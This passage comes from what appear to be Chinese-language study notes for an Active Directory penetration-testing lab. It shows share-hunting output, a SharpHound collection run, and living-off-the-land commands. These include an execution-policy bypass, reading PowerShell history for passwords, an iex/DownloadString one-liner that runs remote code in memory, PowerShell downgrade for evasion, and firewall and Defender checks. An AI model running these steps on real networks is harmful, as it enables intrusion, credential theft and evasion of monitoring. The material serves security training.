class="hljs-type">IT</span>\<span class="hljs-type">Development</span>\<span class="hljs-type">GetUpdate.psafe3</span>) <span class="hljs-type">.psafe3</span><br><span class="hljs-number">2022</span>-<span class="hljs-number">03</span>-<span class="hljs-number">31</span> <span class="hljs-number">12</span>:<span class="hljs-number">17</span>:<span class="hljs-number">19</span> -<span class="hljs-number">07</span>:<span class="hljs-number">00</span> [<span class="hljs-type">File</span>] &#123;<span class="hljs-type">Red</span>&#125;&lt;<span class="hljs-type">KeepExtExactRed</span>|<span class="hljs-type">R</span>|^\<span class="hljs-type">.keypair</span><span class="hljs-variable">$</span>|<span class="hljs-number">278</span><span class="hljs-type">B</span>|<span class="hljs-number">3</span>/<span class="hljs-number">31</span>/<span class="hljs-number">2022</span> <span class="hljs-number">12</span>:<span class="hljs-number">09</span>:<span class="hljs-number">09</span> <span class="hljs-type">PM</span>&gt;(\\<span class="hljs-type">ACADEMY</span>-<span class="hljs-type">EA</span>-<span class="hljs-type">DC01.INLANEFREIGHT.LOCAL</span>\<span class="hljs-type">Department</span> <span class="hljs-type">Shares</span>\<span class="hljs-type">IT</span>\<span class="hljs-type">Infosec</span>\<span class="hljs-type">UnprotectConvertTo.keypair</span>) <span class="hljs-type">.keypair</span><br><span class="hljs-number">2022</span>-<span class="hljs-number">03</span>-<span class="hljs-number">31</span> <span class="hljs-number">12</span>:<span class="hljs-number">17</span>:<span class="hljs-number">19</span> -<span class="hljs-number">07</span>:<span class="hljs-number">00</span> [<span class="hljs-type">File</span>] &#123;<span class="hljs-type">Black</span>&#125;&lt;<span class="hljs-type">KeepExtExactBlack</span>|<span class="hljs-type">R</span>|^\<span class="hljs-type">.tblk</span><span class="hljs-variable">$</span>|<span class="hljs-number">280</span><span class="hljs-type">B</span>|<span class="hljs-number">3</span>/<span class="hljs-number">31</span>/<span class="hljs-number">2022</span> <span class="hljs-number">12</span>:<span class="hljs-number">05</span>:<span class="hljs-number">17</span> <span class="hljs-type">PM</span>&gt;(\\<span class="hljs-type">ACADEMY</span>-<span class="hljs-type">EA</span>-<span class="hljs-type">DC01.INLANEFREIGHT.LOCAL</span>\<span class="hljs-type">Department</span> <span class="hljs-type">Shares</span>\<span class="hljs-type">IT</span>\<span class="hljs-type">Development</span>\<span class="hljs-type">ExportJoin.tblk</span>) <span class="hljs-type">.tblk</span><br><span class="hljs-number">2022</span>-<span class="hljs-number">03</span>-<span class="hljs-number">31</span> <span class="hljs-number">12</span>:<span class="hljs-number">17</span>:<span class="hljs-number">19</span> -<span class="hljs-number">07</span>:<span class="hljs-number">00</span> [<span class="hljs-type">File</span>] &#123;<span class="hljs-type">Red</span>&#125;&lt;<span class="hljs-type">KeepExtExactRed</span>|<span class="hljs-type">R</span>|^\<span class="hljs-type">.mdf</span><span class="hljs-variable">$</span>|<span class="hljs-number">305</span><span class="hljs-type">B</span>|<span class="hljs-number">3</span>/<span class="hljs-number">31</span>/<span class="hljs-number">2022</span> <span class="hljs-number">12</span>:<span class="hljs-number">09</span>:<span class="hljs-number">27</span> <span class="hljs-type">PM</span>&gt;(\\<span class="hljs-type">ACADEMY</span>-<span class="hljs-type">EA</span>-<span class="hljs-type">DC01.INLANEFREIGHT.LOCAL</span>\<span class="hljs-type">Department</span> <span class="hljs-type">Shares</span>\<span class="hljs-type">IT</span>\<span class="hljs-type">Development</span>\<span class="hljs-type">FormatShow.mdf</span>) <span class="hljs-type">.mdf</span><br><span class="hljs-number">2022</span>-<span class="hljs-number">03</span>-<span class="hljs-number">31</span> <span class="hljs-number">12</span>:<span class="hljs-number">17</span>:<span class="hljs-number">19</span> -<span class="hljs-number">07</span>:<span class="hljs-number">00</span> [<span class="hljs-type">File</span>] &#123;<span class="hljs-type">Red</span>&#125;&lt;<span class="hljs-type">KeepExtExactRed</span>|<span class="hljs-type">R</span>|^\<span class="hljs-type">.mdf</span><span class="hljs-variable">$</span>|<span class="hljs-number">299</span><span class="hljs-type">B</span>|<span class="hljs-number">3</span>/<span class="hljs-number">31</span>/<span class="hljs-number">2022</span> <span class="hljs-number">12</span>:<span class="hljs-number">09</span>:<span class="hljs-number">14</span> <span class="hljs-type">PM</span>&gt;(\\<span class="hljs-type">ACADEMY</span>-<span class="hljs-type">EA</span>-<span class="hljs-type">DC01.INLANEFREIGHT.LOCAL</span>\<span class="hljs-type">Department</span> <span class="hljs-type">Shares</span>\<span class="hljs-type">IT</span>\<span class="hljs-type">Development</span>\<span class="hljs-type">LockConfirm.mdf</span>) <span class="hljs-type">.mdf</span><br><br>&lt;<span class="hljs-type">SNIP</span>&gt;<br></code></pre></td></tr></table></figure>

<h2 id="11-BloodHound"><a href="#11-BloodHound" class="headerlink" title="11. BloodHound"></a>11. BloodHound</h2><h3 id="SharpHound-实战"><a href="#SharpHound-实战" class="headerlink" title="SharpHound 实战"></a>SharpHound 实战</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\htb&gt; .\SharpHound.exe <span class="hljs-literal">-c</span> All <span class="hljs-literal">--zipfilename</span> ILFREIGHT<br><br><span class="hljs-number">2022</span><span class="hljs-literal">-04-18T13</span>:<span class="hljs-number">58</span>:<span class="hljs-number">22.1163680</span><span class="hljs-literal">-07</span>:<span class="hljs-number">00</span>|INFORMATION|Resolved Collection Methods: <span class="hljs-built_in">Group</span>, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote<br><span class="hljs-number">2022</span><span class="hljs-literal">-04-18T13</span>:<span class="hljs-number">58</span>:<span class="hljs-number">22.1163680</span><span class="hljs-literal">-07</span>:<span class="hljs-number">00</span>|INFORMATION|Initializing SharpHound at <span class="hljs-number">1</span>:<span class="hljs-number">58</span> PM on <span class="hljs-number">4</span>/<span class="hljs-number">18</span>/<span class="hljs-number">2022</span><br><span class="hljs-number">2022</span><span class="hljs-literal">-04-18T13</span>:<span class="hljs-number">58</span>:<span class="hljs-number">22.6788709</span><span class="hljs-literal">-07</span>:<span class="hljs-number">00</span>|INFORMATION|Flags: <span class="hljs-built_in">Group</span>, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote<br><span class="hljs-number">2022</span><span class="hljs-literal">-04-18T13</span>:<span class="hljs-number">58</span>:<span class="hljs-number">23.0851206</span><span class="hljs-literal">-07</span>:<span class="hljs-number">00</span>|INFORMATION|Beginning LDAP search <span class="hljs-keyword">for</span> INLANEFREIGHT.LOCAL<br><span class="hljs-number">2022</span><span class="hljs-literal">-04-18T13</span>:<span class="hljs-number">58</span>:<span class="hljs-number">53.9132950</span><span class="hljs-literal">-07</span>:<span class="hljs-number">00</span>|INFORMATION|Status: <span class="hljs-number">0</span> objects finished (+<span class="hljs-number">0</span> <span class="hljs-number">0</span>)/s <span class="hljs-literal">--</span> <span class="hljs-keyword">Using</span> 67 MB RAM<br><span class="hljs-number">2022</span><span class="hljs-literal">-04-18T13</span>:<span class="hljs-number">59</span>:<span class="hljs-number">15.7882419</span><span class="hljs-literal">-07</span>:<span class="hljs-number">00</span>|INFORMATION|Producer has finished, closing LDAP channel<br><span class="hljs-number">2022</span><span class="hljs-literal">-04-18T13</span>:<span class="hljs-number">59</span>:<span class="hljs-number">16.1788930</span><span class="hljs-literal">-07</span>:<span class="hljs-number">00</span>|INFORMATION|LDAP channel closed, waiting <span class="hljs-keyword">for</span> consumers<br><span class="hljs-number">2022</span><span class="hljs-literal">-04-18T13</span>:<span class="hljs-number">59</span>:<span class="hljs-number">23.9288698</span><span class="hljs-literal">-07</span>:<span class="hljs-number">00</span>|INFORMATION|Status: <span class="hljs-number">3793</span> objects finished (+<span class="hljs-number">3793</span> <span class="hljs-number">63.21667</span>)/s <span class="hljs-literal">--</span> <span class="hljs-keyword">Using</span> 112 MB RAM<br><span class="hljs-number">2022</span><span class="hljs-literal">-04-18T13</span>:<span class="hljs-number">59</span>:<span class="hljs-number">45.4132561</span><span class="hljs-literal">-07</span>:<span class="hljs-number">00</span>|INFORMATION|Consumers finished, closing output channel<br>Closing writers<br><span class="hljs-number">2022</span><span class="hljs-literal">-04-18T13</span>:<span class="hljs-number">59</span>:<span class="hljs-number">45.4601086</span><span class="hljs-literal">-07</span>:<span class="hljs-number">00</span>|INFORMATION|Output channel closed, waiting <span class="hljs-keyword">for</span> output task to complete<br><span class="hljs-number">2022</span><span class="hljs-literal">-04-18T13</span>:<span class="hljs-number">59</span>:<span class="hljs-number">45.8663528</span><span class="hljs-literal">-07</span>:<span class="hljs-number">00</span>|INFORMATION|Status: <span class="hljs-number">3809</span> objects finished (+<span class="hljs-number">16</span> <span class="hljs-number">46.45122</span>)/s <span class="hljs-literal">--</span> <span class="hljs-keyword">Using</span> 110 MB RAM<br><span class="hljs-number">2022</span><span class="hljs-literal">-04-18T13</span>:<span class="hljs-number">59</span>:<span class="hljs-number">45.8663528</span><span class="hljs-literal">-07</span>:<span class="hljs-number">00</span>|INFORMATION|Enumeration finished <span class="hljs-keyword">in</span> <span class="hljs-number">00</span>:<span class="hljs-number">01</span>:<span class="hljs-number">22.7919186</span><br><span class="hljs-number">2022</span><span class="hljs-literal">-04-18T13</span>:<span class="hljs-number">59</span>:<span class="hljs-number">46.3663660</span><span class="hljs-literal">-07</span>:<span class="hljs-number">00</span>|INFORMATION|SharpHound Enumeration Completed at <span class="hljs-number">1</span>:<span class="hljs-number">59</span> PM on <span class="hljs-number">4</span>/<span class="hljs-number">18</span>/<span class="hljs-number">2022</span>! Happy Graphing<br></code></pre></td></tr></table></figure>

<h1 id="Living-Off-the-Land"><a href="#Living-Off-the-Land" class="headerlink" title="Living Off the Land"></a>Living Off the Land</h1><h2 id="主机与网络侦察的环境命令"><a href="#主机与网络侦察的环境命令" class="headerlink" title="主机与网络侦察的环境命令"></a>主机与网络侦察的环境命令</h2><table>
<thead>
<tr>
<th><strong>命令</strong></th>
<th><strong>结果</strong></th>
</tr>
</thead>
<tbody><tr>
<td><code>hostname</code></td>
<td>打印计算机的名称</td>
</tr>
<tr>
<td><code>[System.Environment]::OSVersion.Version</code></td>
<td>输出操作系统版本和修订级别</td>
</tr>
<tr>
<td><code>wmic qfe get Caption,Description,HotFixID,InstalledOn</code></td>
<td>打印应用于主机的补丁和热修复程序</td>
</tr>
<tr>
<td><code>ipconfig /all</code></td>
<td>输出网络适配器状态和配置</td>
</tr>
<tr>
<td><code>set</code></td>
<td>显示当前会话的环境变量列表（从 CMD 提示符运行）</td>
</tr>
<tr>
<td><code>echo %USERDOMAIN%</code></td>
<td>显示主机所属的域名（从 CMD 提示符运行）</td>
</tr>
<tr>
<td><code>echo %logonserver%</code></td>
<td>输出主机所检查的域控制器的名称（从 CMD 提示符运行）</td>
</tr>
</tbody></table>
<h2 id="利用-PowerShell"><a href="#利用-PowerShell" class="headerlink" title="利用 PowerShell"></a>利用 PowerShell</h2><table>
<thead>
<tr>
<th><strong>Cmd-Let</strong></th>
<th><strong>描述</strong></th>
</tr>
</thead>
<tbody><tr>
<td><code>Get-Module</code></td>
<td>列出可用的已加载模块以供使用。</td>
</tr>
<tr>
<td><code>Get-ExecutionPolicy -List</code></td>
<td>将打印主机上每个作用域的执行策略设置。</td>
</tr>
<tr>
<td><code>Set-ExecutionPolicy Bypass -Scope Process</code></td>
<td>这将使用 <code>-Scope</code> 参数更改我们当前进程的策略。这样做后，一旦我们退出或终止该进程，策略将恢复。这是理想的做法，因为我们不会对受害主机进行永久性更改。</td>
</tr>
<tr>
<td>&#96;Get-ChildItem Env:</td>
<td>ft Key,Value&#96;</td>
</tr>
<tr>
<td><code>Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt</code></td>
<td>通过此字符串，我们可以获取指定用户的 PowerShell 历史记录。这非常有用，因为命令历史记录可能包含密码，或引导我们找到包含密码的配置文件或脚本。</td>
</tr>
<tr>
<td><code>powershell -nop -c &quot;iex(New-Object Net.WebClient).DownloadString(&#39;URL to download the file from&#39;); &lt;follow-on commands&gt;&quot;</code></td>
<td>这是一种使用 PowerShell 从网页快速轻松下载文件并从内存中调用的方法。</td>
</tr>
</tbody></table>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\htb&gt; <span class="hljs-built_in">Get-Module</span><br><br>ModuleType Version    Name                                ExportedCommands<br><span class="hljs-literal">----------</span> <span class="hljs-literal">-------</span>    <span class="hljs-literal">----</span>                                <span class="hljs-literal">----------------</span><br>Manifest   <span class="hljs-number">1.0</span>.<span class="hljs-number">1.0</span>    ActiveDirectory                     &#123;<span class="hljs-built_in">Add-ADCentralAccessPolicyMember</span>, <span class="hljs-built_in">Add-ADComputerServiceAcc</span>...<br>Manifest   <span class="hljs-number">3.1</span>.<span class="hljs-number">0.0</span>    Microsoft.PowerShell.Utility        &#123;<span class="hljs-built_in">Add-Member</span>, <span class="hljs-built_in">Add-Type</span>, <span class="hljs-built_in">Clear-Variable</span>, <span class="hljs-built_in">Compare-Object</span>...&#125;<br>Script     <span class="hljs-number">2.0</span>.<span class="hljs-number">0</span>      PSReadline                          &#123;<span class="hljs-built_in">Get-PSReadLineKeyHandler</span>, <span class="hljs-built_in">Get-PSReadLineOption</span>, <span class="hljs-built_in">Remove-PS</span>...<br><br><span class="hljs-built_in">PS</span> C:\htb&gt; <span class="hljs-built_in">Get-ExecutionPolicy</span> <span class="hljs-literal">-List</span><br><span class="hljs-built_in">Get-ExecutionPolicy</span> <span class="hljs-literal">-List</span><br><br>        Scope ExecutionPolicy<br>        <span class="hljs-literal">-----</span> <span class="hljs-literal">---------------</span><br>MachinePolicy       Undefined<br>   UserPolicy       Undefined<br>      <span class="hljs-keyword">Process</span>       Undefined<br>  CurrentUser       Undefined<br> LocalMachine    RemoteSigned<br><br><br><span class="hljs-built_in">PS</span> C:\htb&gt; whoami<br>nt authority\system<br><br><span class="hljs-built_in">PS</span> C:\htb&gt; <span class="hljs-built_in">Get-ChildItem</span> Env: | <span class="hljs-built_in">ft</span> key,value<br><br><span class="hljs-built_in">Get-ChildItem</span> Env: | <span class="hljs-built_in">ft</span> key,value<br><br>Key                     Value<br><span class="hljs-literal">---</span>                     <span class="hljs-literal">-----</span><br>ALLUSERSPROFILE         C:\ProgramData<br>APPDATA                 C:\Windows\system32\config\systemprofile\AppData\Roaming<br>CommonProgramFiles      C:\Program Files (x86)\Common Files<br>CommonProgramFiles(x86) C:\Program Files (x86)\Common Files<br>CommonProgramW6432      C:\Program Files\Common Files<br>COMPUTERNAME            ACADEMY<span class="hljs-literal">-EA-MS01</span><br>ComSpec                 C:\Windows\system32\cmd.exe<br>DriverData              C:\Windows\System32\Drivers\DriverData<br>LOCALAPPDATA            C:\Windows\system32\config\systemprofile\AppData\Local<br>NUMBER_OF_PROCESSORS    <span class="hljs-number">4</span><br>OS                      Windows_NT<br>Path                    C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShel...<br>PATHEXT                 .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC;.CPL<br>PROCESSOR_ARCHITECTURE  x86<br>PROCESSOR_ARCHITEW6432  AMD64<br>PROCESSOR_IDENTIFIER    AMD64 Family <span class="hljs-number">23</span> Model <span class="hljs-number">49</span> Stepping <span class="hljs-number">0</span>, AuthenticAMD<br>PROCESSOR_LEVEL         <span class="hljs-number">23</span><br>PROCESSOR_REVISION      <span class="hljs-number">3100</span><br>ProgramData             C:\ProgramData<br>ProgramFiles            C:\Program Files (x86)<br>ProgramFiles(x86)       C:\Program Files (x86)<br>ProgramW6432            C:\Program Files<br>PROMPT                  <span class="hljs-variable">$P</span><span class="hljs-variable">$G</span><br>PSModulePath            C:\Program Files\WindowsPowerShell\Modules;WindowsPowerShell\Modules;C:\Program Files (x86)\...<br>PUBLIC                  C:\Users\Public<br>SystemDrive             C:<br>SystemRoot              C:\Windows<br>TEMP                    C:\Windows\TEMP<br>TMP                     C:\Windows\TEMP<br>USERDOMAIN              INLANEFREIGHT<br>USERNAME                ACADEMY<span class="hljs-literal">-EA-MS01</span><span class="hljs-variable">$</span><br>USERPROFILE             C:\Windows\system32\config\systemprofile<br>windir                  C:\Windows<br></code></pre></td></tr></table></figure>

<h3 id="降级-PowerShell-更加opsec"><a href="#降级-PowerShell-更加opsec" class="headerlink" title="降级 PowerShell(更加opsec)"></a>降级 PowerShell(更加opsec)</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\htb&gt; <span class="hljs-built_in">Get-host</span><br><br>Name             : ConsoleHost<br>Version          : <span class="hljs-number">5.1</span>.<span class="hljs-number">19041.1320</span><br>InstanceId       : <span class="hljs-number">18</span>ee9fb4<span class="hljs-literal">-ac42-4dfe-85b2-61687291bbfc</span><br>UI               : System.Management.Automation.Internal.Host.InternalHostUserInterface<br>CurrentCulture   : en<span class="hljs-literal">-US</span><br>CurrentUICulture : en<span class="hljs-literal">-US</span><br>PrivateData      : Microsoft.PowerShell.ConsoleHost+ConsoleColorProxy<br>DebuggerEnabled  : True<br>IsRunspacePushed : False<br>Runspace         : System.Management.Automation.Runspaces.LocalRunspace<br><br><span class="hljs-built_in">PS</span> C:\htb&gt; powershell.exe <span class="hljs-literal">-version</span> <span class="hljs-number">2</span><br>Windows PowerShell<br>Copyright (C) <span class="hljs-number">2009</span> Microsoft Corporation. All rights reserved.<br><br><span class="hljs-built_in">PS</span> C:\htb&gt; <span class="hljs-built_in">Get-host</span><br>Name             : ConsoleHost<br>Version          : <span class="hljs-number">2.0</span><br>InstanceId       : <span class="hljs-number">121</span>b807c<span class="hljs-literal">-6daa-4691-85ef-998ac137e469</span><br>UI               : System.Management.Automation.Internal.Host.InternalHostUserInterface<br>CurrentCulture   : en<span class="hljs-literal">-US</span><br>CurrentUICulture : en<span class="hljs-literal">-US</span><br>PrivateData      : Microsoft.PowerShell.ConsoleHost+ConsoleColorProxy<br>IsRunspacePushed : False<br>Runspace         : System.Management.Automation.Runspaces.LocalRunspace<br><br><span class="hljs-built_in">PS</span> C:\htb&gt; <span class="hljs-built_in">get-module</span><br><br>ModuleType Version    Name                                ExportedCommands<br><span class="hljs-literal">----------</span> <span class="hljs-literal">-------</span>    <span class="hljs-literal">----</span>                                <span class="hljs-literal">----------------</span><br>Script     <span class="hljs-number">0.0</span>        chocolateyProfile                   &#123;TabExpansion, <span class="hljs-built_in">Update-SessionEnvironment</span>, refreshenv&#125;<br>Manifest   <span class="hljs-number">3.1</span>.<span class="hljs-number">0.0</span>    Microsoft.PowerShell.Management     &#123;<span class="hljs-built_in">Add-Computer</span>, <span class="hljs-built_in">Add-Content</span>, <span class="hljs-built_in">Checkpoint-Computer</span>, <span class="hljs-built_in">Clear-Content</span>...&#125;<br>Manifest   <span class="hljs-number">3.1</span>.<span class="hljs-number">0.0</span>    Microsoft.PowerShell.Utility        &#123;<span class="hljs-built_in">Add-Member</span>, <span class="hljs-built_in">Add-Type</span>, <span class="hljs-built_in">Clear-Variable</span>, <span class="hljs-built_in">Compare-Object</span>...&#125;<br>Script     <span class="hljs-number">0.7</span>.<span class="hljs-number">3.1</span>    posh<span class="hljs-literal">-git</span>                            &#123;<span class="hljs-built_in">Add-PoshGitToProfile</span>, <span class="hljs-built_in">Add-SshKey</span>, <span class="hljs-built_in">Enable-GitColors</span>, <span class="hljs-built_in">Expand-GitCommand</span>...&#125;<br>Script     <span class="hljs-number">2.0</span>.<span class="hljs-number">0</span>      PSReadline                          &#123;<span class="hljs-built_in">Get-PSReadLineKeyHandler</span>, <span class="hljs-built_in">Get-PSReadLineOption</span>, <span class="hljs-built_in">Remove-PSReadLineKeyHandler</span>...<br></code></pre></td></tr></table></figure>

<h3 id="检查防御措施"><a href="#检查防御措施" class="headerlink" title="检查防御措施"></a>检查防御措施</h3><p><strong>防火墙检查</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\htb&gt; netsh advfirewall show allprofiles<br><br>Domain Profile Settings:<br><span class="hljs-literal">----------------------------------------------------------------------</span><br>State                                 OFF<br>Firewall Policy                       BlockInbound,AllowOutbound<br>LocalFirewallRules                    N/A (GPO<span class="hljs-literal">-store</span> only)<br>LocalConSecRules                      N/A (GPO<span class="hljs-literal">-store</span> only)<br>InboundUserNotification               Disable<br>RemoteManagement                      Disable<br>UnicastResponseToMulticast            Enable<br><br>Logging:<br>LogAllowedConnections                 Disable<br>LogDroppedConnections                 Disable<br>FileName                              %systemroot%\system32\LogFiles\Firewall\pfirewall.log<br>MaxFileSize                           <span class="hljs-number">4096</span><br><br>Private Profile Settings:<br><span class="hljs-literal">----------------------------------------------------------------------</span><br>State                                 OFF<br>Firewall Policy                       BlockInbound,AllowOutbound<br>LocalFirewallRules                    N/A (GPO<span class="hljs-literal">-store</span> only)<br>LocalConSecRules                      N/A (GPO<span class="hljs-literal">-store</span> only)<br>InboundUserNotification               Disable<br>RemoteManagement                      Disable<br>UnicastResponseToMulticast            Enable<br><br>Logging:<br>LogAllowedConnections                 Disable<br>LogDroppedConnections                 Disable<br>FileName                              %systemroot%\system32\LogFiles\Firewall\pfirewall.log<br>MaxFileSize                           <span class="hljs-number">4096</span><br><br>Public Profile Settings:<br><span class="hljs-literal">----------------------------------------------------------------------</span><br>State                                 OFF<br>Firewall Policy                       BlockInbound,AllowOutbound<br>LocalFirewallRules                    N/A (GPO<span class="hljs-literal">-store</span> only)<br>LocalConSecRules                      N/A (GPO<span class="hljs-literal">-store</span> only)<br>InboundUserNotification               Disable<br>RemoteManagement                      Disable<br>UnicastResponseToMulticast            Enable<br><br>Logging:<br>LogAllowedConnections                 Disable<br>LogDroppedConnections                 Disable<br>FileName                              %systemroot%\system32\LogFiles\Firewall\pfirewall.log<br>MaxFileSize                           <span class="hljs-number">4096</span><br></code></pre></td></tr></table></figure>

<h3 id="Windows-Defender-检查"><a href="#Windows-Defender-检查" class="headerlink" title="Windows Defender 检查"></a>Windows Defender 检查</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-function">C:\<span class="hljs-title">htb</span>&gt; <span class="hljs-title">sc</span> <span class="hljs-title">query</span> <span class="hljs-title">windefend</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">SERVICE_NAME</span>: <span class="hljs-title">windefend</span></span><br><span class="hljs-function">        <span class="hljs-title">TYPE</span>               : 10  <span class="hljs-title">WIN32_OWN_PROCESS</span></span><br><span class="hljs-function">        <span class="hljs-title">STATE</span>              : 4  <span class="hljs-title">RUNNING</span></span><br><span class="hljs-function">                                (<span class="hljs-title">STOPPABLE</span>, <span class="hljs-title">NOT_PAUSABLE</span>, <span class="hljs-title">ACCEPTS_SHUTDOWN</span>)</span><br><span class="hljs-function">        <span class="hljs-title">WIN32_EXIT_CODE</span>    : 0  (0<span class="hljs-title">x0</span>)</span><br><span class="hljs-function">        <span class="hljs-title">SERVICE_EXIT_CODE</span>  : 0  (0<span class="hljs-title">x0</span>)</span><br><span class="hljs-function">        <span class="hljs-title">CHECKPOINT</span>         : 0<span class="hljs-title">x0</span></span><br><span class="hljs-function">        <span class="hljs-title">WAIT_HINT</span>          : 0<span class="hljs-title">x0</span></span><br></code></pre></td></tr></table></figure>

<h3 id="Get-MpComputerStatus"><a href="#Get-MpComputerStatus" class="headerlink" title="Get-MpComputerStatus"></a>Get-MpComputerStatus</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\htb&gt; <span class="hljs-built_in">Get-MpComputerStatus</span><br><br>AMEngineVersion                  : <span class="hljs-number">1.1</span>.<span class="hljs-number">19000.8</span><br>AMProductVersion                 : <span class="hljs-number">4.18</span>.<span class="hljs-number">2202.4</span><br>AMRunningMode                    : Normal<br>AMServiceEnabled                 : True<br>AMServiceVersion                 : <span class="hljs-number">4.18</span>.<span class="hljs-number">2202.4</span><br>AntispywareEnabled               : True<br>AntispywareSignatureAge          : <span class="hljs-number">0</span><br>AntispywareSignatureLastUpdated  : <span class="hljs-number">3</span>/<span class="hljs-number">21</span>/<span class="hljs-number">2022</span> <span class="hljs-number">4</span>:<span class="hljs-number">06</span>:<span class="hljs-number">15</span> AM<br>AntispywareSignatureVersion      : <span class="hljs-number">1.361</span>.<span class="hljs-number">414.0</span><br>AntivirusEnabled                 : True<br>AntivirusSignatureAge            : <span class="hljs-number">0</span><br>AntivirusSignatureLastUpdated    : <span class="hljs-number">3</span>/<span class="hljs-number">21</span>/<span class="hljs-number">2022</span> <span class="hljs-number">4</span>:<span class="hljs-number">06</span>:<span class="hljs-number">16</span> AM<br>AntivirusSignatureVersion        : <span class="hljs-number">1.361</span>.<span class="hljs-number">414.0</span><br>BehaviorMonitorEnabled           : True<br>ComputerID                       : 